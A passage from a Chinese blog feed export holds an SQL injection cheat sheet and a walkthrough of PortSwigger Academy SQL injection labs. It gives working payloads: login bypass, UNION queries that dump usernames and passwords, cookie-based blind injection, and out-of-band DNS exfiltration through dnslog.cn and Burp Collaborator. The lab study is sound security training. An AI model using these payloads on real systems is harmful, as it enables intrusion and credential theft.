src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114222013263.png" alt="image-20221114222013263"></p><p>得到flag。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>http</tag>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[burpsuite] academy-sql注入查询表</title>
    <link href="/2022/11/13/%5Bburpsuite%5D%20academy-sql%E6%B3%A8%E5%85%A5%E6%9F%A5%E8%AF%A2%E8%A1%A8/"/>
    <url>/2022/11/13/%5Bburpsuite%5D%20academy-sql%E6%B3%A8%E5%85%A5%E6%9F%A5%E8%AF%A2%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="sql注入查询表"><a href="#sql注入查询表" class="headerlink" title="sql注入查询表"></a>sql注入查询表</h1><p>sql注入查询表，可能会更新。</p><h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><p>将多个字符串拼接为一个。</p><table><thead><tr><th>数据库</th><th>语法</th></tr></thead><tbody><tr><td>Oracle</td><td>&#96;’foo’</td></tr><tr><td>Microsoft</td><td><code>&#39;foo&#39;+&#39;bar&#39;</code></td></tr><tr><td>PostgreSQL</td><td>&#96;’foo’</td></tr><tr><td>MySQL</td><td><code>&#39;foo&#39; &#39;bar&#39;</code><br /><code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code></td></tr></tbody></table><h2 id="字符串子串"><a href="#字符串子串" class="headerlink" title="字符串子串"></a>字符串子串</h2><p>字符串截取。</p><table><thead><tr><th>数据库</th><th>语法</th></tr></thead><tbody><tr><td>Oracle</td><td><code>SUBSTR(&#39;foobar&#39;,4,2)</code></td></tr><tr><td>Microsoft</td><td><code>SUBSTRING(&#39;foobar&#39;,4,2)</code></td></tr><tr><td>PostgreSQL</td><td><code>SUBSTRING(&#39;foobar&#39;,4,2)</code></td></tr><tr><td>MySQL</td><td><code>SUBSTRING(&#39;foobar&#39;,4,2)</code></td></tr></tbody></table><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>注释。</p><table><thead><tr><th>数据库</th><th>语法</th></tr></thead><tbody><tr><td>Oracle</td><td><code>--comment</code></td></tr><tr><td>Microsoft</td><td><code>--comment</code><br /><code>/*comment*/</code></td></tr><tr><td>PostgreSQL</td><td><code>--comment</code><br /><code>/*comment*/</code></td></tr><tr><td>MySQL</td><td><code>#comment</code><br /><code>-- comment</code><br /><code>/*comment*/</code></td></tr></tbody></table><h2 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h2><p>数据库版本。</p><table><thead><tr><th>数据库</th><th>语法</th></tr></thead><tbody><tr><td>Oracle</td><td><code>SELECT banner FROM v$version</code><br /><code>SELECT version FROM v$instance</code></td></tr><tr><td>Microsoft</td><td><code>SELECT @@version</code></td></tr><tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr><tr><td>MySQL</td><td><code>SELECT @@version</code></td></tr></tbody></table><h2 id="数据库内容"><a href="#数据库内容" class="headerlink" title="数据库内容"></a>数据库内容</h2><p>数据库内容。</p><table><thead><tr><th align="left">数据库</th><th>语法</th></tr></thead><tbody><tr><td align="left">Oracle</td><td><code>SELECT * FROM all_tables</code><br /><code>SELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td></tr><tr><td align="left">Microsoft</td><td><code>SELECT * FROM information_schema.tables</code><br /><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td></tr><tr><td align="left">PostgreSQL</td><td><code>SELECT * FROM information_schema.tables</code><br /><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td></tr><tr><td align="left">MySQL</td><td><code>SELECT * FROM information_schema.tables</code><br /><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td></tr></tbody></table><h2 id="条件错误"><a href="#条件错误" class="headerlink" title="条件错误"></a>条件错误</h2><p>测试单个布尔条件，如果条件为真，则触发数据库错误。</p><table><thead><tr><th align="left">数据库</th><th>语法</th></tr></thead><tbody><tr><td align="left">Oracle</td><td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></td></tr><tr><td align="left">Microsoft</td><td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td></tr><tr><td align="left">PostgreSQL</td><td><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)</code></td></tr><tr><td align="left">MySQL</td><td><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</code></td></tr></tbody></table><h2 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h2><p>使用批处理查询（堆叠查询）连续执行多个查询。请注意，在执行后续查询时，结果不会返回给应用程序。因此，此技术主要用于盲漏洞，可以使用第二个查询来触发DNS查找、条件错误或时间延迟。</p><table><thead><tr><th align="left">数据库</th><th>语法</th></tr></thead><tbody><tr><td align="left">Oracle</td><td>不支持</td></tr><tr><td align="left">Microsoft</td><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr><tr><td align="left">PostgreSQL</td><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr><tr><td align="left">MySQL</td><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr></tbody></table><h2 id="时间延迟"><a href="#时间延迟" class="headerlink" title="时间延迟"></a>时间延迟</h2><p>处理查询时，可能会导致数据库中的时间延迟。以下情况将导致10秒的无条件延时。</p><table><thead><tr><th align="left">数据库</th><th>语法</th></tr></thead><tbody><tr><td align="left">Oracle</td><td><code>dbms_pipe.receive_message((&#39;a&#39;),10)</code></td></tr><tr><td align="left">Microsoft</td><td><code>WAITFOR DELAY &#39;0:0:10&#39;</code></td></tr><tr><td align="left">PostgreSQL</td><td><code>SELECT pg_sleep(10)</code></td></tr><tr><td align="left">MySQL</td><td><code>SELECT SLEEP(10)</code></td></tr></tbody></table><h2 id="条件时间延迟"><a href="#条件时间延迟" class="headerlink" title="条件时间延迟"></a>条件时间延迟</h2><p>可以测试单个布尔条件，如果条件为真，则触发时间延迟。</p><table><thead><tr><th align="left">数据库</th><th>语法</th></tr></thead><tbody><tr><td align="left">Oracle</td><td>&#96;SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN ‘a’</td></tr><tr><td align="left">Microsoft</td><td><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39;</code></td></tr><tr><td align="left">PostgreSQL</td><td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td></tr><tr><td align="left">MySQL</td><td><code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),&#39;a&#39;)</code></td></tr></tbody></table><h2 id="DNS-lookup"><a href="#DNS-lookup" class="headerlink" title="DNS lookup"></a>DNS lookup</h2><p>可以使数据库对外部域执行DNS查找。要做到这一点，需要使用<code>Burp Collaborator</code>客户端生成将在攻击中使用的唯一Burp协作器子域，然后轮询协作器服务器以确认发生了DNS查找。</p><table><thead><tr><th align="left">数据库</th><th>语法</th></tr></thead><tbody><tr><td align="left">Oracle</td><td>利用XXE触发DNS lookup，该漏洞已修复：<br /><code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code> <br /><br />以下适用于打过补丁的，但是需要提权 ：<br /><code>SELECT UTL_INADDR.get_host_address(&#39;BURP-COLLABORATOR-SUBDOMAIN&#39;)</code></td></tr><tr><td align="left">Microsoft</td><td><code>exec master..xp_dirtree &#39;//BURP-COLLABORATOR-SUBDOMAIN/a&#39;</code></td></tr><tr><td align="left">PostgreSQL</td><td><code>copy (SELECT &#39;&#39;) to program &#39;nslookup BURP-COLLABORATOR-SUBDOMAIN&#39;</code></td></tr><tr><td align="left">MySQL</td><td>仅在windows有效：<br /><code>LOAD_FILE(&#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#39;)</code> <br /><code>SELECT ... INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#39;</code></td></tr></tbody></table><p>在MySQL的实例：</p><p>首先在<code>dnslog.cn</code>生成一个域名，然后进行这样的查询：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> load_file(concat(<span class="hljs-string">&#x27;//&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.81k8pu.dnslog.cn/abc&#x27;</span>));<br></code></pre></td></tr></table></figure><p>在<code>dnslog.cn</code>中刷新就会得到记录：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[数据库]</span>.<span class="hljs-number">81</span>k8pu<span class="hljs-selector-class">.dnslog</span>.cn<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>sql注入</category>
      
      <category>burpsuite</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>sql注入</tag>
      
      <tag>burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[burpsuite] academy-sql注入实验室</title>
    <link href="/2022/11/13/%5Bburpsuite%5D%20academy-sql%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C%E5%AE%A4/"/>
    <url>/2022/11/13/%5Bburpsuite%5D%20academy-sql%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C%E5%AE%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="BurpSuite-SQL注入实验室"><a href="#BurpSuite-SQL注入实验室" class="headerlink" title="BurpSuite SQL注入实验室"></a>BurpSuite SQL注入实验室</h1><p>BurpSuite中SQL注入LAB。</p><h2 id="Lab-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><a href="#Lab-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data" class="headerlink" title="Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"></a>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2><p>这个实验是利用SQL注入查询隐藏的数据。</p><p>这个实验中的页面可以通过种类查看产品，发送请求类似：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>a46001403d042a6c07ccd2700e30008.web-security-academy.net/filter?category=Lifestyle<br></code></pre></td></tr></table></figure><p>如果要查看所有的数据，那么可以这样：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://<span class="hljs-number">0</span>a46001403d042a6c07ccd2700e30008.web-security-academy.net/filter?category=Lifestyle&#x27; OR <span class="hljs-number">1</span>=<span class="hljs-number">1</span>-- -<br></code></pre></td></tr></table></figure><p>解决。</p><h2 id="Lab-SQL-injection-vulnerability-allowing-login-bypass"><a href="#Lab-SQL-injection-vulnerability-allowing-login-bypass" class="headerlink" title="Lab: SQL injection vulnerability allowing login bypass"></a>Lab: SQL injection vulnerability allowing login bypass</h2><p>登录认证的绕过，以<code>administrator</code>的身份登录。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">用户名<br>administrato<span class="hljs-string">r&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br>密码：<br><span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>解决。</p><h2 id="Lab-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><a href="#Lab-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query" class="headerlink" title="Lab: SQL injection UNION attack, determining the number of columns returned by the query"></a>Lab: SQL injection UNION attack, determining the number of columns returned by the query</h2><p>这个实验通过<code>UNION</code>查询回显列数。</p><p>这个实验可以通过目录查看产品，发送请求类似：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>ad800f20424df36c092811700a800e8.web-security-academy.net/filter?category=Pets<br></code></pre></td></tr></table></figure><p>确定回显的列数，经过测试发现返回的是3列，这里使用<code>NULL</code>，因为回显的数据类型不同，</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//<span class="hljs-number">0</span>ad<span class="hljs-number">800</span>f<span class="hljs-number">20424</span>df<span class="hljs-number">36</span><span class="hljs-keyword">c</span><span class="hljs-number">092811700</span>a<span class="hljs-number">800e8</span>.web-security-academy.net/<span class="hljs-keyword">filter</span>?category<span class="hljs-operator">=</span>Pets&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span><span class="hljs-punctuation">,</span><span class="hljs-keyword">null</span><span class="hljs-punctuation">,</span><span class="hljs-keyword">null</span>-- -<br></code></pre></td></tr></table></figure><p>不过检查回显列数最好使用<code>ORDER BY</code>。</p><p>解决。</p><h2 id="Lab-SQL-injection-UNION-attack-finding-a-column-containing-text"><a href="#Lab-SQL-injection-UNION-attack-finding-a-column-containing-text" class="headerlink" title="Lab: SQL injection UNION attack, finding a column containing text"></a>Lab: SQL injection UNION attack, finding a column containing text</h2><p>这个实验是为了检查回显类型。</p><p>实验中会给出一个随机字符串，在进入实验后的标题下面，然后是为了将这个字符串通过<code>UNION</code>查询显示出来。</p><p>发送的请求类似：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>ab900200477ef6ec093f4a100280076.web-security-academy.net/filter?category=Accessories<br></code></pre></td></tr></table></figure><p>首先确定回显列数：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//<span class="hljs-number">0</span>ab<span class="hljs-number">900200477</span>ef<span class="hljs-number">6</span>ec<span class="hljs-number">093</span>f<span class="hljs-number">4</span>a<span class="hljs-number">100280076</span>.web-security-academy.net/<span class="hljs-keyword">filter</span>?category<span class="hljs-operator">=</span>Accessories&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span><span class="hljs-punctuation">,</span><span class="hljs-keyword">null</span><span class="hljs-punctuation">,</span><span class="hljs-keyword">null</span>-- -<br></code></pre></td></tr></table></figure><p>然后测试回显的位置，这个需要测试这三个回显，可能回显为数字，可能回显为字符串，最后发现第二个回显的是字符串，所以将随机字符串在这里测试：</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">https://<span class="hljs-number">0</span>ab900200477ef6ec093f4a100280076.web-security-academy.net/filter?category=Accessories&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-symbol">&#x27;HsKeU3</span>&#x27;,<span class="hljs-keyword">null</span><span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure><p>解决。</p><h2 id="Lab-SQL-injection-UNION-attack-retrieving-data-from-other-tables"><a href="#Lab-SQL-injection-UNION-attack-retrieving-data-from-other-tables" class="headerlink" title="Lab: SQL injection UNION attack, retrieving data from other tables"></a>Lab: SQL injection UNION attack, retrieving data from other tables</h2><p>通过<code>UNION</code>查询得到所有的用户名和密码，然后以<code>administrator</code>身份登录。</p><p>同样的步骤确定回显列数为2，回显的类型都是字符串，</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://<span class="hljs-number">0</span>a51005a0472410ec0731620005500cc.web-security-academy.net/<span class="hljs-built_in">filter</span>?category=Accessories<span class="hljs-string">&#x27; union select &#x27;</span><span class="hljs-keyword">a</span><span class="hljs-string">&#x27;,&#x27;</span>b<span class="hljs-string">&#x27;-- -</span><br></code></pre></td></tr></table></figure><p>然后根据题目描述从<code>users</code>表中查看<code>username</code>和<code>password</code>列，</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//<span class="hljs-number">0</span>a<span class="hljs-number">51005</span>a<span class="hljs-number">0472410</span>ec<span class="hljs-number">0731620005500</span><span class="hljs-keyword">cc</span>.web-security-academy.net/<span class="hljs-keyword">filter</span>?category<span class="hljs-operator">=</span>Accessories&#x27; union <span class="hljs-keyword">select</span> username<span class="hljs-punctuation">,</span>password from users-- -<br></code></pre></td></tr></table></figure><p>以<code>administrator</code>身份登录。</p><p>解决。</p><h2 id="Lab-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column"><a href="#Lab-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column" class="headerlink" title="Lab: SQL injection UNION attack, retrieving multiple values in a single column"></a>Lab: SQL injection UNION attack, retrieving multiple values in a single column</h2><p>通过<code>UNION</code>查询在一列中显示结果。</p><p>这个回显是两列，但是只有一列会显示出来，所以可以通过条件查询来显示指定的数据：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">https://0a0e005c04a8dfefc0c888830057003e.web-security-academy.net/filter?category=Pets&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;administrator&#x27;</span>-- -<br></code></pre></td></tr></table></figure><p>以<code>administrator</code>身份登录。</p><p>解决。</p><h2 id="Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><a href="#Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle" class="headerlink" title="Lab: SQL injection attack, querying the database type and version on Oracle"></a>Lab: SQL injection attack, querying the database type and version on Oracle</h2><p>查询Oracle的版本。</p><blockquote><p>查询数据库版本：</p><ul><li>Oracle<br><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code></li><li>Microsoft<br><code>SELECT @@VERSION</code></li><li>PostgreSQL<br><code>SELECT version()</code></li><li>MySQL<br><code>SELECT @@VERSION</code></li></ul></blockquote><p>使用Oracle数据库查询的时候需要用<code>dual</code>表，比如<code>SELECT &#39;abc&#39; FROM dual</code>，所以这里查看回显的时候需要这样：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://<span class="hljs-number">0</span>a8500ea047b5589c03c93370073001d.web-security-academy.net/<span class="hljs-built_in">filter</span>?category=<span class="hljs-string">&#x27; union select &#x27;</span><span class="hljs-keyword">a</span><span class="hljs-string">&#x27;,&#x27;</span>b<span class="hljs-string">&#x27; from dual-- -</span><br></code></pre></td></tr></table></figure><p>查询数据库版本信息时这样：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://<span class="hljs-number">0</span>a8500ea047b5589c03c93370073001d.web-security-academy.net/<span class="hljs-built_in">filter</span>?category=<span class="hljs-string">&#x27; union select &#x27;</span><span class="hljs-keyword">a</span><span class="hljs-string">&#x27;,banner FROM v$version-- -</span><br></code></pre></td></tr></table></figure><p>解决。</p><h2 id="Lab-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><a href="#Lab-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft" class="headerlink" title="Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft"></a>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</h2><p>查询MySQL和MS-SQL的版本。</p><p>查询语句是这样的：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://<span class="hljs-number">0</span>a2d00eb03086e4cc0084ee300750008.web-security-academy.net/<span class="hljs-built_in">filter</span>?category=Gifts<span class="hljs-string">&#x27; union select &#x27;</span><span class="hljs-keyword">a</span><span class="hljs-string">&#x27;,version()-- -</span><br></code></pre></td></tr></table></figure><p>解决。</p><h2 id="Lab-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><a href="#Lab-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases" class="headerlink" title="Lab: SQL injection attack, listing the database contents on non-Oracle databases"></a>Lab: SQL injection attack, listing the database contents on non-Oracle databases</h2><p>列出数据库的内容（非Oracle数据库）。</p><p>数据库中有一个表保存用户名和密码，首先要直到这个表的名称，然后查询其中数据，以<code>administrator</code>身份登录。</p><p>首先查询表：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://<span class="hljs-number">0</span>acd00b803e2c090c0ce69f600a30044.web-security-academy.net/<span class="hljs-built_in">filter</span>?category=Pets<span class="hljs-string">&#x27; union select &#x27;</span><span class="hljs-keyword">a</span><span class="hljs-string">&#x27;,table_name from information_schema.tables-- -</span><br></code></pre></td></tr></table></figure><p>显示的是所有的表，使用<code>database()</code>和<code>group_concat()</code>都是不行的。</p><p>接着查询列：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//<span class="hljs-number">0</span>acd<span class="hljs-number">00</span>b<span class="hljs-number">803e2</span><span class="hljs-keyword">c</span><span class="hljs-number">090</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>ce<span class="hljs-number">69</span>f<span class="hljs-number">600</span>a<span class="hljs-number">30044</span>.web-security-academy.net/<span class="hljs-keyword">filter</span>?category<span class="hljs-operator">=</span>Pets&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span><span class="hljs-punctuation">,</span>column_name from information_schema.columns-- -<br></code></pre></td></tr></table></figure><p>这里显示的是所有的列。</p><p>最后得出表名是<code>users_zckisl</code>，列名<code>username_ikojlb</code>和<code>password_qrozsy</code>。</p><p>查询用户信息：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//<span class="hljs-number">0</span>acd<span class="hljs-number">00</span>b<span class="hljs-number">803e2</span><span class="hljs-keyword">c</span><span class="hljs-number">090</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>ce<span class="hljs-number">69</span>f<span class="hljs-number">600</span>a<span class="hljs-number">30044</span>.web-security-academy.net/<span class="hljs-keyword">filter</span>?category<span class="hljs-operator">=</span>Pets&#x27; union <span class="hljs-keyword">select</span> username_ikojlb<span class="hljs-punctuation">,</span>password_qrozsy from users_zckisl-- -<br></code></pre></td></tr></table></figure><p>最后以<code>administrator</code>身份登录。</p><p>解决。</p><h2 id="Lab-SQL-injection-attack-listing-the-database-contents-on-Oracle"><a href="#Lab-SQL-injection-attack-listing-the-database-contents-on-Oracle" class="headerlink" title="Lab: SQL injection attack, listing the database contents on Oracle"></a>Lab: SQL injection attack, listing the database contents on Oracle</h2><p>列出Oracle数据库的内容。</p><p>首先Oracle数据库的查询有所不同：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://<span class="hljs-number">0</span>a0500c703dc1e29c03c0290006900f4.web-security-academy.net/<span class="hljs-built_in">filter</span>?category=Pets<span class="hljs-string">&#x27; union select &#x27;</span><span class="hljs-keyword">a</span><span class="hljs-string">&#x27;,&#x27;</span>b<span class="hljs-string">&#x27; from dual-- -</span><br></code></pre></td></tr></table></figure><p>查询所有表：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//<span class="hljs-number">0</span>a<span class="hljs-number">0500</span><span class="hljs-keyword">c</span><span class="hljs-number">703</span>dc<span class="hljs-number">1e29</span><span class="hljs-keyword">c</span><span class="hljs-number">03</span><span class="hljs-keyword">c</span><span class="hljs-number">0290006900</span>f<span class="hljs-number">4</span>.web-security-academy.net/<span class="hljs-keyword">filter</span>?category<span class="hljs-operator">=</span>Pets&#x27; union <span class="hljs-keyword">select</span> &#x27;a&#x27;<span class="hljs-punctuation">,</span>table_name from all_tables-- -<br></code></pre></td></tr></table></figure><p>查询列：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://<span class="hljs-number">0</span>a0500c703dc1e29c03c0290006900f4.web-security-academy.net/<span class="hljs-built_in">filter</span>?category=Pets<span class="hljs-string">&#x27; union select &#x27;</span><span class="hljs-keyword">a</span><span class="hljs-string">&#x27;,column_name from all_tab_columns where table_name=&#x27;</span>USERS_GHCEXS<span class="hljs-string">&#x27;-- -</span><br></code></pre></td></tr></table></figure><p>得到表名：<code>USERS_GHCEXS</code>，列名：<code>USERNAME_ADIWDB</code>和<code>PASSWORD_FQQOQV</code>。</p><p>查询信息：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//<span class="hljs-number">0</span>a<span class="hljs-number">0500</span><span class="hljs-keyword">c</span><span class="hljs-number">703</span>dc<span class="hljs-number">1e29</span><span class="hljs-keyword">c</span><span class="hljs-number">03</span><span class="hljs-keyword">c</span><span class="hljs-number">0290006900</span>f<span class="hljs-number">4</span>.web-security-academy.net/<span class="hljs-keyword">filter</span>?category<span class="hljs-operator">=</span>Pets&#x27; union <span class="hljs-keyword">select</span> USERNAME_ADIWDB<span class="hljs-punctuation">,</span>PASSWORD_FQQOQV from USERS_GHCEXS-- -<br></code></pre></td></tr></table></figure><p>以<code>administrator</code>身份登录。</p><p>解决。</p><h2 id="Lab-Blind-SQL-injection-with-conditional-responses"><a href="#Lab-Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Lab: Blind SQL injection with conditional responses"></a>Lab: Blind SQL injection with conditional responses</h2><p>盲注。</p><p>注入点在Cookie，首先抓包，然后：</p><ul><li><code>TrackingId=xxx&#39; and 1=1-- -</code>包含关键字<code>Welcome back</code></li><li><code>TrackingId=xxx&#39; and 1=2-- -</code>不包含关键字<code>Welcome back</code></li></ul><p>已经知道了表名：<code>users</code>，列名：<code>username</code>和<code>password</code>，用户<code>administrator</code>，可以直接查询密码：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">TrackingId</span>=c8HItvOO5HAanUoK&#x27; <span class="hljs-keyword">AND</span> (select length(password) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;administrator&#x27;</span>)&gt;5-- -<br></code></pre></td></tr></table></figure><p>最后发现长度为19（太长了，不想注了）</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>sql注入</category>
      
      <category>burpsuite</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>sql注入</tag>
      
      <tag>burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[burpsuite] academy-sql注入</title>
    <link href="/2022/11/12/%5Bburpsuite%5D%20academy-sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/11/12/%5Bburpsuite%5D%20academy-sql%E6%B3%A8%E5%85%A5/</url>
    
